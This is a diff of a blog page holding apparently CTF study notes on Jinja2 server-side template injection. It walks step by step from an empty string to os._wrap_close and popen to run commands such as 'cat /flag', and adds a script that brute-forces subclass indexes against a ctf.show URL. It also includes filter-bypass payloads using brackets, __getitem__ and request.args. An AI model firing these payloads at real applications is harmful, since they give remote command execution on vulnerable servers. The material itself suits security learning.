@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-07
+                    2022-09-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    210
+                    1.1k
                 </div>
                 
 
@@ -444,11 +444,131 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>1.这里&lt;通关人&gt;没任何过滤，但有长度限制，只能25个字符以内，&lt;排名&gt;和&lt;通关时间&gt;都有严格的校验，&lt;通关感言&gt;有较严格的过滤，包括下划线、单双引号、request、中括号、百分号等一些关键字符</p>
-<p>导致只通过其中一个输入框无法getshell，需要多个输入框进行配合getshell</p>
-<pre class="line-numbers language-none"><code class="language-none">/edit?a=__init__&amp;b=__globals__&amp;c=__getitem__&amp;d=os&amp;e=popen&amp;f=whoami&amp;g=read
-POST:
-name={%25set r=request.args%25}&amp;rank=1&amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;time=2021年11月11日<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+                <h2 id="1-如何得到payload"><a href="#1-如何得到payload" class="headerlink" title="1.如何得到payload"></a>1.如何得到payload</h2><pre class="line-numbers language-none"><code class="language-none">{{7*'7'}}回显是7777777，判断是Jinja2模板（如果回显是49则为Twig模板）
+
+如何得到payload？
+
+1、先找基类object，用空字符串""来找
+
+在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。
+
+使用?name={{"".__class__}}，得到空字符串的类&lt;class 'str'&gt;
+
+点号. ：python中用来访问变量的属性
+
+__class__：类的一个内置属性，表示实例对象空字符串""的类。
+
+然后使用?name={{"".__class__.__mro__}}，得到(&lt;class 'tuple'&gt;, &lt;class 'object'&gt;)
+
+__mro__              method resolution order，即解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
+
+然后再用?name={{().__class__.__mro__[-1]}}，取得最后一个东西即空字符串的类的基类&lt;class 'object'&gt;
+
+或者使用?name={{"".__class__.__bases__}}，得到空字符串的类的基类&lt;class 'object'&gt;
+
+__base__             类型对象的直接基类
+__bases__           类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
+
+2、得到基类之后，找到这个基类的子类集合
+
+使用?name={{().__class__.__mro__[1].__subclasses__()}}
+
+__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。
+
+3、找到其所有子类集合之后找一个我们能够使用的类，要求是这个类的某个方法能够被我们用于执行、找到flag
+
+这里使用其第133个类（[0]是第一个类）&lt;class 'os._wrap_close'&gt;
+
+使用?name={{"".__class__.__mro__[-1].__subclasses__()[132]}}，得到&lt;class 'os._wrap_close'&gt;
+
+&lt;class 'os._wrap_close'&gt;        这个类有个popen方法可以执行系统命令
+
+4、实例化我们找到的类对象
+
+使用?name={{"".__class__.__mro__[-1].__subclasses__()[132].__init__}}，实例化这个类
+
+__init__             初始化类，返回的类型是function
+
+5、找到这个实例化对象的所有方法
+
+使用?name={{"".__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__}}
+
+__globals__          使用方式是 function.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+
+6、根据方法寻找flag
+
+?name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
+
+popen()一个方法，用于执行命令
+
+read() 从文件当前位置起读取size个字节，若无参数size，则表示读取至文件结束为止，它范围为字符串对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="1-查找指定类的序号"><a href="#1-查找指定类的序号" class="headerlink" title="1.查找指定类的序号"></a>1.查找指定类的序号</h3><pre class="line-numbers language-none"><code class="language-none">## 本地查找
+import requests
+
+search ="popen"
+
+num=-1
+s=().__class__.__mro__[-1].__subclasses__()
+for i  in s:
+  num+=1
+  try:
+    if search in  i.__init__.__globals__.keys():
+      print(i,num)
+  except:
+    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">根据题目环境查找
+
+import requests
+
+url="http://e4734666-c1af-4cf3-bce3-41fd267e2eff.challenge.ctf.show/?name="
+for i in range(0,300):
+  print(i)
+  payload="{{().__class__.__mro__[-1].__subclasses__()[%s]}}" %i
+  print(payload)
+  r=requests.get(url=url+payload).text
+  if "os._wrap_close" in r:
+    print(r)
+    print(i)
+    break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="2-python2和python3-有区别"><a href="#2-python2和python3-有区别" class="headerlink" title="2.python2和python3 有区别"></a>2.python2和python3 有区别</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/14154635.html">细说</a></p>
+<h2 id="3-ssti绕过的学习"><a href="#3-ssti绕过的学习" class="headerlink" title="3.ssti绕过的学习"></a>3.ssti绕过的学习</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">ssti绕过</a></p>
+<pre class="line-numbers language-none"><code class="language-none">{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。
+{{}}用于将表达式打印到模板输出
+{##}表示未包含在模板输出中的注释
+##可以有和{%%}相同的效果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>除了标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性。</p>
+<pre class="line-numbers language-none"><code class="language-none">{{"".__class__}}
+{{""['__class__']}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>所以过滤了点，我们还可以用中括号绕过。</strong><br>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code><br><strong>所以对于取字典中键值的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></strong><br>当然对于字典来说，我们也可以用他自带的一些方法了。pop就是其中的一个</p>
+<pre class="line-numbers language-none"><code class="language-none">pop(key[,default])
+参数
+key: 要删除的键值
+default: 如果没有 key，返回 default 值
+删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。
+
+dict.get(key, default=None)
+返回指定键的值，如果值不在字典中返回default值
+
+dict.setdefault(key, default=None)
+和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>例子</p>
+<pre class="line-numbers language-none"><code class="language-none">{{url_for.__globals__['__builtins__']}}
+{{url_for.__globals__.__getitem__('__builtins__')}}
+{{url_for.__globals__.pop('__builtins__')}}
+{{url_for.__globals__.get('__builtins__')}}
+{{url_for.__globals__.setdefault('__builtins__')}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 
 <p>2.目前遇到最短payload</p>
 <pre class="line-numbers language-none"><code class="language-none">{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -984,7 +1104,7 @@ name={%25set r=request.args%25}&amp;rank=1&amp;speech={{(config|attr(r.a)|attr(r
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">20.8k</span>
+                        class="white-color">24.3k</span>
             
             
             
